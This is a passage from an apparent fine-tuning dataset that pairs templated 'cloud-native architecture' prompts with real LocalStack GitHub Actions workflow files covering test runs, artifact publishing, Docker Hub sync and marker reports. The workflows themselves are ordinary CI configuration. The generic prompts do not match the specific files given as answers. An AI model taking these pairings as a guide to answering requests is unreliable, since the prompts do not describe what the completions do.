lambda-common-${{ env.PLATFORM }}\n          path: |\n            tests/aws/services/lambda_/functions/common\n\n      - name: Load Localstack Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: \"${{ env.PLATFORM }}\"\n\n      - name: Download Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/download-artifact@v4\n        with:\n          name: test-selection\n          path: dist/testselection/\n\n      - name: Run Integration Tests\n        timeout-minutes: 120\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --splits 4 --group ${{ matrix.group }} --store-durations --clean-durations --ignore=tests/unit/ --ignore=tests/bootstrap --ignore=tests/aws/services/cloudformation/v2\"\n          COVERAGE_FILE: \"target/.coverage.integration-${{ env.PLATFORM }}-${{ matrix.group }}\"\n          JUNIT_REPORTS_FILE: \"target/pytest-junit-integration-${{ env.PLATFORM }}-${{ matrix.group }}.xml\"\n          DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n          # increase Docker SDK timeout to avoid timeouts on BuildJet runners - https://github.com/docker/docker-py/issues/2266\n          DOCKER_SDK_DEFAULT_TIMEOUT_SECONDS: 300\n        run: make docker-run-tests\n\n      # Test durations are fetched and merged automatically by a separate workflow.\n      # Files must have unique names to prevent overwrites when multiple artifacts are downloaded\n      - name: Rename test durations file\n        run: |\n          mv .test_durations .test_durations-${{ env.PLATFORM }}-${{ matrix.group }}\n\n      - name: Archive Test Durations\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: pytest-split-durations-${{ env.PLATFORM }}-${{ matrix.group }}\n          path: .test_durations-${{ env.PLATFORM }}-${{ matrix.group }}\n          include-hidden-files: true\n          retention-days: 5\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-integration-${{ env.PLATFORM }}-${{ matrix.group }}\n          include-hidden-files: true\n          path: |\n            target/pytest-junit-integration-${{ env.PLATFORM }}-${{ matrix.group }}.xml\n            target/.coverage.integration-${{ env.PLATFORM }}-${{ matrix.group }}\n          retention-days: 30\n\n      - name: Archive Parity Metric Results\n        if: success()\n        uses: actions/upload-artifact@v4\n        with:\n          name: parity-metric-raw-${{ env.PLATFORM }}-${{ matrix.group }}\n          path: target/metric_reports\n          retention-days: 30\n\n  test-bootstrap:\n    name: Test Bootstrap\n    if: ${{ !inputs.onlyAcceptanceTests }}\n    runs-on: ubuntu-latest\n    needs:\n      - test-preflight\n      - build\n    timeout-minutes: 60\n    env:\n      PLATFORM: 'amd64'\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Load Localstack Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: \"${{ env.PLATFORM }}\"\n\n      - name: Run Bootstrap Tests\n        timeout-minutes: 30\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          TEST_PATH: \"tests/bootstrap\"\n          COVERAGE_FILE: \".coverage.bootstrap\"\n          JUNIT_REPORTS_FILE: \"pytest-junit-bootstrap.xml\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }} -o junit_suite_name=bootstrap-tests\"\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-bootstrap\n          include-hidden-files: true\n          path: |\n            pytest-junit-bootstrap.xml\n            .coverage.bootstrap\n          retention-days: 30\n\n  publish-test-results:\n    name: Publish Test Results\n    strategy:\n      matrix:\n        arch:\n          - amd64\n          - arm64\n        exclude:\n          # skip the ARM integration tests in forks, and also if not on main/upgrade-dependencies and forceARMTests is not set to true\n          # TODO ARM runners are not yet available for private repositories; skip them for potential private forks\n          - arch: ${{ ((github.repository != 'localstack/localstack') || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v') && github.ref != 'upgrade-dependencies' && inputs.forceARMTests == false)) && 'arm64' || ''}}\n    needs:\n      - test-integration\n      - test-bootstrap\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n      pull-requests: write\n      contents: read\n      issues: read\n    # execute on success or failure, but not if the workflow is cancelled or any of the dependencies has been skipped\n    if: always() && !cancelled() && !contains(needs.*.result, 'skipped')\n    steps:\n      - name: Download Bootstrap Artifacts\n        uses: actions/download-artifact@v4\n        if: ${{ matrix.arch == 'amd64' }}\n        with:\n          pattern: test-results-bootstrap\n\n      - name: Download Integration Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-integration-${{ matrix.arch }}-*\n\n      - name: Publish Bootstrap and Integration Test Results\n        uses: EnricoMi/publish-unit-test-result-action@v2\n        if: success() || failure()\n        with:\n          files: |\n            **/pytest-junit-*.xml\n          check_name: \"Test Results (${{ matrix.arch }}${{ inputs.testAWSAccountId != '000000000000' && ', MA/MR' || ''}}) - Integration${{ matrix.arch == 'amd64' && ', Bootstrap' || ''}}\"\n          test_file_prefix: \"-/opt/code/localstack/\"\n          action_fail_on_inconclusive: true\n\n  test-acceptance:\n    name: \"Acceptance Tests (${{ contains(matrix.runner, 'arm') && 'ARM64' || 'AMD64' }})\"\n    needs:\n      - build\n    strategy:\n      matrix:\n        runner:\n          - ubuntu-latest\n          - ubuntu-24.04-arm\n        exclude:\n          # skip the ARM integration tests in forks, and also if not on main/upgrade-dependencies and forceARMTests is not set to true\n          # TODO ARM runners are not yet available for private repositories; skip them for potential private forks\n          - runner: ${{ ((github.repository != 'localstack/localstack') || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v') && github.ref != 'upgrade-dependencies' && inputs.forceARMTests == false)) && 'ubuntu-24.04-arm' || ''}}\n      fail-fast: false\n    runs-on: ${{ matrix.runner }}\n    env:\n      # Acceptance tests are executed for all test cases, without any test selection\n      TESTSELECTION_PYTEST_ARGS: \"\"\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}-${{ contains(matrix.runner, 'arm') && 'arm' || 'amd' }}\n      CI_JOB_ID: ${{ github.job }}-${{ contains(matrix.runner, 'arm') && 'arm' || 'amd' }}\n    steps:\n      - name: Determine Runner Architecture\n        shell: bash\n        run: echo \"PLATFORM=${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\" >> $GITHUB_ENV\n\n      - name: Login to Docker Hub\n        # login to DockerHub to avoid rate limiting issues on custom runners\n        if: github.repository_owner == 'localstack' && env.DOCKER_PULL_SECRET_AVAILABLE == 'true'\n        uses: docker/login-action@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          password: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n\n      - name: Set environment\n        if: ${{ inputs.testEnvironmentVariables != ''}}\n        shell: bash\n        run: |\n          echo \"${{ inputs.testEnvironmentVariables }}\" | sed \"s/;/\\n/\" >> $GITHUB_ENV\n\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Load Localstack Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: \"${{ env.PLATFORM }}\"\n\n      - name: Run Acceptance Tests\n        timeout-minutes: 120\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DEBUG: 1\n          LOCALSTACK_INTERNAL_TEST_COLLECT_METRIC: 1\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --reruns 3 -m acceptance_test -o junit_suite_name='acceptance_test'\"\n          COVERAGE_FILE: \"target/.coverage.acceptance-${{ env.PLATFORM }}\"\n          JUNIT_REPORTS_FILE: \"target/pytest-junit-acceptance-${{ env.PLATFORM }}.xml\"\n          TEST_PATH: \"tests/aws/\"\n          DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n        run: make docker-run-tests\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-acceptance-${{ env.PLATFORM }}\n          include-hidden-files: true\n          path: |\n            target/pytest-junit-acceptance-${{ env.PLATFORM }}.xml\n            target/.coverage.acceptance-${{ env.PLATFORM }}\n          retention-days: 30\n\n  publish-acceptance-test-results:\n    name: Publish Acceptance Test Results\n    strategy:\n      matrix:\n        arch:\n          - amd64\n          - arm64\n        exclude:\n          # skip the ARM integration tests in forks, and also if not on main/upgrade-dependencies and forceARMTests is not set to true\n          # TODO ARM runners are not yet available for private repositories; skip them for potential private forks\n          - arch: ${{ ((github.repository != 'localstack/localstack') || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v') && github.ref != 'upgrade-dependencies' && inputs.forceARMTests == false)) && 'arm64' || ''}}\n    needs:\n      - test-acceptance\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n      pull-requests: write\n      contents: read\n      issues: read\n    # execute on success or failure, but not if the workflow is cancelled or any of the dependencies has been skipped\n    if: always() && !cancelled() && !contains(needs.*.result, 'skipped')\n    steps:\n      - name: Download Acceptance Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-acceptance-${{ matrix.arch }}\n\n      - name: Publish Acceptance Test Results\n        uses: EnricoMi/publish-unit-test-result-action@v2\n        if: success() || failure()\n        with:\n          files: |\n            **/pytest-junit-*.xml\n          check_name: \"Test Results (${{ matrix.arch }}${{ inputs.testAWSAccountId != '000000000000' && ', MA/MR' || ''}}) - Acceptance\"\n          test_file_prefix: \"-/opt/code/localstack/\"\n          action_fail_on_inconclusive: true\n\n  test-cloudwatch-v1:\n    name: Test CloudWatch V1\n    if: ${{ !inputs.onlyAcceptanceTests && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') || needs.test-preflight.outputs.cloudwatch-v1 == 'true') }}\n    runs-on: ubuntu-latest\n    needs:\n      - test-preflight\n      - build\n    timeout-minutes: 60\n    env:\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Download Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/download-artifact@v4\n        with:\n          name: test-selection\n          path: dist/testselection/\n\n      - name: Run Cloudwatch v1 Provider Tests\n        timeout-minutes: 30\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DEBUG: 1\n          COVERAGE_FILE: \".coverage.cloudwatch_v1\"\n          TEST_PATH: \"tests/aws/services/cloudwatch/\"\n          JUNIT_REPORTS_FILE: \"pytest-junit-cloudwatch-v1.xml\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --reruns 3 -o junit_suite_name=cloudwatch_v1\"\n          PROVIDER_OVERRIDE_CLOUDWATCH: \"v1\"\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-cloudwatch-v1\n          include-hidden-files: true\n          path: |\n            pytest-junit-cloudwatch-v1.xml\n            .coverage.cloudwatch_v1\n          retention-days: 30\n\n  test-ddb-v2:\n    name: Test DynamoDB(Streams) v2\n    if: ${{ !inputs.onlyAcceptanceTests && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') || needs.test-preflight.outputs.dynamodb-v2 == 'true') }}\n    runs-on: ubuntu-latest\n    needs:\n      - test-preflight\n      - build\n    timeout-minutes: 60\n    env:\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Download Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/download-artifact@v4\n        with:\n          name: test-selection\n          path: dist/testselection/\n\n      - name: Run DynamoDB(Streams) v2 Provider Tests\n        timeout-minutes: 30\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          COVERAGE_FILE: \".coverage.dynamodb_v2\"\n          TEST_PATH: \"tests/aws/services/dynamodb/ tests/aws/services/dynamodbstreams/ tests/aws/services/lambda_/event_source_mapping/test_lambda_integration_dynamodbstreams.py\"\n          JUNIT_REPORTS_FILE: \"pytest-junit-dynamodb-v2.xml\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --reruns 3 -o junit_suite_name=dynamodb_v2\"\n          PROVIDER_OVERRIDE_DYNAMODB: \"v2\"\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-dynamodb-v2\n          include-hidden-files: true\n          path: |\n            pytest-junit-dynamodb-v2.xml\n            .coverage.dynamodb_v2\n          retention-days: 30\n\n  test-events-v1:\n    name: Test EventBridge v1\n    if: ${{ !inputs.onlyAcceptanceTests && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') || needs.test-preflight.outputs.events-v1 == 'true') }}\n    runs-on: ubuntu-latest\n    needs:\n      - test-preflight\n      - build\n    timeout-minutes: 60\n    env:\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Download Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/download-artifact@v4\n        with:\n          name: test-selection\n          path: dist/testselection/\n\n      - name: Run EventBridge v1 Provider Tests\n        timeout-minutes: 30\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DEBUG: 1\n          COVERAGE_FILE: \".coverage.events_v1\"\n          TEST_PATH: \"tests/aws/services/events/\"\n          JUNIT_REPORTS_FILE: \"pytest-junit-events-v1.xml\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --reruns 3 -o junit_suite_name=events_v1\"\n          PROVIDER_OVERRIDE_EVENTS: \"v1\"\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-events-v1\n          path: |\n            pytest-junit-events-v1.xml\n            .coverage.events_v1\n          retention-days: 30\n\n  test-cfn-v2-engine:\n    name: Test CloudFormation Engine v2\n    if: ${{ !inputs.onlyAcceptanceTests && ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') || needs.test-preflight.outputs.cloudformation-v2 == 'true' )}}\n    runs-on: ubuntu-latest\n    needs:\n      - test-preflight\n      - build\n    timeout-minutes: 60\n    env:\n      COVERAGE_FILE: \".coverage.cloudformation_v2\"\n      JUNIT_REPORTS_FILE: \"pytest-junit-cloudformation-v2.xml\"\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Download Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/download-artifact@v4\n        with:\n          name: test-selection\n          path: dist/testselection/\n\n      - name: Run CloudFormation Engine v2 Tests\n        timeout-minutes: 30\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          TEST_PATH: \"tests/aws/services/cloudformation/v2\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}${{ env.TESTSELECTION_PYTEST_ARGS }} --reruns 3 -o junit_suite_name='cloudformation_v2'\"\n          PROVIDER_OVERRIDE_CLOUDFORMATION: \"engine-v2\"\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-cloudformation-v2\n          include-hidden-files: true\n          path: |\n            ${{ env.COVERAGE_FILE }}\n            ${{ env.JUNIT_REPORTS_FILE }}\n          retention-days: 30\n\n  publish-alternative-provider-test-results:\n    name: Publish Alternative Provider Test Results\n    needs:\n      - test-cfn-v2-engine\n      - test-events-v1\n      - test-ddb-v2\n      - test-cloudwatch-v1\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n      pull-requests: write\n      contents: read\n      issues: read\n    # execute on success or failure, but not if the workflow is cancelled or any of the dependencies has been skipped\n    if: always() && !cancelled() && !contains(needs.*.result, 'skipped')\n    steps:\n      - name: Download Cloudformation v2 Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-cloudformation-v2\n\n      - name: Download EventBridge v1 Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-events-v1\n\n      - name: Download DynamoDB v2 Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-dynamodb-v2\n\n      - name: Download CloudWatch v1 Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-cloudwatch-v1\n\n      - name: Publish Bootstrap and Integration Test Results\n        uses: EnricoMi/publish-unit-test-result-action@v2\n        if: success() || failure()\n        with:\n          files: |\n            **/pytest-junit-*.xml\n          check_name: \"Test Results ${{ inputs.testAWSAccountId != '000000000000' && '(MA/MR) ' || ''}}- Alternative Providers\"\n          test_file_prefix: \"-/opt/code/localstack/\"\n          action_fail_on_inconclusive: true\n\n  capture-not-implemented:\n    name: \"Capture Not Implemented\"\n    if: ${{ !inputs.onlyAcceptanceTests && ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') ) }}\n    runs-on: ubuntu-latest\n    needs: build\n    env:\n      PLATFORM: 'amd64'\n    steps:\n      - name: Login to Docker Hub\n        # login to DockerHub to avoid rate limiting issues on custom runners\n        if: github.repository_owner == 'localstack' && env.DOCKER_PULL_SECRET_AVAILABLE == 'true'\n        uses: docker/login-action@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          password: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Load Localstack Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: \"${{ env.PLATFORM }}\"\n\n      - name: Install Community Dependencies\n        run: make install-dev\n\n      - name: Start LocalStack\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DISABLE_EVENTS: \"1\"\n          DEBUG: 1\n          IMAGE_NAME: \"localstack/localstack:latest\"\n        run: |\n          source .venv/bin/activate\n          localstack start -d\n          localstack wait -t 120 || (localstack logs && false)\n\n      - name: Run capture-not-implemented\n        run: |\n          source .venv/bin/activate\n          cd scripts\n          mkdir ../results\n          python -m capture_notimplemented_responses ../results/\n\n      - name: Print the logs\n        run: |\n          source .venv/bin/activate\n          localstack logs\n\n      - name: Stop localstack\n        run: |\n          source .venv/bin/activate\n          localstack stop\n\n      - name: Archive Capture-Not-Implemented Results\n        uses: actions/upload-artifact@v4\n        with:\n          name: capture-notimplemented\n          path: results/\n          retention-days: 30\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/aws-tests.yml", "language": "yaml", "complexity": "complex", "star_count": 59801, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 956}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: AWS / Archive feature files\n\non:\n  schedule:\n    - cron: 0 9 * * TUE\n  workflow_dispatch:\n\njobs:\n  validate-features-files:\n      name: Create artifact with features files\n      uses: localstack/meta/.github/workflows/create-artifact-with-features-files.yml@main\n      with:\n        artifact_name: 'features-files'\n        aws_services_path: 'localstack-core/localstack/services'\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/create_artifact_with_features_files.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 15}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Update Docker Hub Description\n\non:\n  push:\n    branches:\n      - main\n    paths:\n      - DOCKER.md\n      - .github/workflows/dockerhub-description.yml\n\njobs:\n  dockerHubDescription:\n    name: Sync DockerHub Description\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Docker Hub Description\n      uses: peter-evans/dockerhub-description@v4\n      with:\n        username: ${{ secrets.DOCKERHUB_USERNAME }}\n        password: ${{ secrets.DOCKERHUB_PASSWORD }}\n        repository: localstack/localstack\n        short-description: ${{ github.event.repository.description }}\n        readme-filepath: DOCKER.md\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/dockerhub-description.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 26}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Generate pytest marker report / Open marker report GH issue\non:\n  workflow_dispatch:\n    inputs:\n      dryRun:\n        description: 'Execute a Dry-Run? A Dry-Run will not create any issues and only print the issue content in the logs instead'\n        required: false\n        type: boolean\n        default: false\n      updateExistingIssue:\n        description: 'Select the empty string \"\" to open duplicate issues, \"true\" to update duplicate issues and \"false\" to skip duplicate issues'\n        required: false\n        type: choice\n        default: ''\n        options:\n          - ''\n          - 'false'\n          - 'true'\n      createIssue:\n        description: 'Open marker report github issue'\n        required: false\n        type: boolean\n        default: false\n\n  push:\n    paths:\n      - \"tests/**\"\n    branches:\n      - main\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true\n\njobs:\n  marker-report:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Set up Python\n        id: setup-python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n\n      - name: Cache LocalStack community dependencies (venv)\n        uses: actions/cache@v4\n        with:\n          path: .venv\n          key: ${{ runner.os }}-python-${{ steps.setup-python.outputs.python-version }}-venv-${{ hashFiles('requirements-dev.txt') }}\n\n      - name: Install dependencies\n        run: make install-dev\n\n      - name: Collect marker report\n        if: ${{ !inputs.createIssue }}\n        env:\n          PYTEST_ADDOPTS: \"-p no:localstack.testing.pytest.fixtures -p no:localstack_snapshot.pytest.snapshot -p no:localstack.testing.pytest.filters -p no:localstack.testing.pytest.fixture_conflicts -p no:tests.fixtures -p no:localstack.testing.pytest.stepfunctions.fixtures -p no:localstack.testing.pytest.cloudformation.fixtures -s --co --disable-warnings --marker-report --marker-report-tinybird-upload\"\n          MARKER_REPORT_PROJECT_NAME: localstack\n          MARKER_REPORT_TINYBIRD_TOKEN: ${{ secrets.MARKER_REPORT_TINYBIRD_TOKEN }}\n          MARKER_REPORT_COMMIT_SHA: ${{ github.sha }}\n        run: |\n          . ./.venv/bin/activate\n          python -m pytest tests/aws/\n\n        # makes use of the marker report plugin localstack.testing.pytest.marker_report\n      - name: Generate marker report\n        env:\n          PYTEST_ADDOPTS: \"-p no:localstack.testing.pytest.fixtures -p no:localstack_snapshot.pytest.snapshot -p no:localstack.testing.pytest.filters -p no:localstack.testing.pytest.fixture_conflicts -p no:tests.fixtures -p no:localstack.testing.pytest.stepfunctions.fixtures -p no:localstack.testing.pytest.cloudformation.fixtures -p no: -s --co --disable-warnings --marker-report --marker-report-path './target'\"\n          MARKER_REPORT_PROJECT_NAME: localstack\n          MARKER_REPORT_COMMIT_SHA: ${{ github.sha }}\n        run: |\n          . ./.venv/bin/activate\n          pip install codeowners\n          python -m pytest tests/aws/\n          mv ./target/marker-report*.json ./target/marker-report.json\n\n      - name: Enrich and render marker report\n        if: ${{ inputs.createIssue }}\n        env:\n          MARKER_REPORT_PATH: ./target/marker-report.json\n          CODEOWNERS_PATH: ./CODEOWNERS\n          TEMPLATE_PATH: ./.github/bot_templates/MARKER_REPORT_ISSUE.md.j2\n          OUTPUT_PATH: ./target/MARKER_REPORT_ISSUE.md\n          GITHUB_REPO: ${{ github.repository }}\n          COMMIT_SHA: ${{ github.sha }}\n        run: |\n          . ./.venv/bin/activate\n          pip install codeowners\n          python scripts/render_marker_report.py\n\n      - name: Print generated markdown\n        if: ${{ inputs.createIssue }}\n        run: |\n          cat ./target/MARKER_REPORT_ISSUE.md\n\n      - name: Upload generated markdown\n        if: ${{ inputs.createIssue }}\n        uses: actions/upload-artifact@v4\n        with:\n          path: ./target/MARKER_REPORT_ISSUE.md\n\n      - name: Create GH issue from template\n        if: inputs.dryRun != true && inputs.createIssue == true\n        uses: JasonEtco/create-an-issue@v2\n        env:\n          GITHUB_TOKEN: ${{ secrets.PRO_ACCESS_TOKEN }}\n        with:\n          # `update_existing` actually has 3 possible values:\n          # 1. not set => will always open duplicates\n          # 2. false => will not update and will not open duplicates (NOOP if title conflict detected)\n          # 3. true => will update an existing one if conflict detected\n          update_existing: ${{ inputs.updateExistingIssue || '' }}\n#          search_existing: open\n          filename: ./target/MARKER_REPORT_ISSUE.md\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/marker-report.yml", "language": "yaml", "complexity": "medium", "star_count": 59801, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 121}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Validate AWS features files\n\non:\n  pull_request:\n    paths:\n      - localstack-core/localstack/services/**\n    branches:\n      - main\n\njobs:\n  validate-features-files:\n      uses: localstack/meta/.github/workflows/pr-validate-features-files.yml@main\n      with:\n        aws_services_path: 'localstack-core/localstack/services'\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/pr-validate-features-files.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 15}, "authority_level": "high", "authentic": true}}
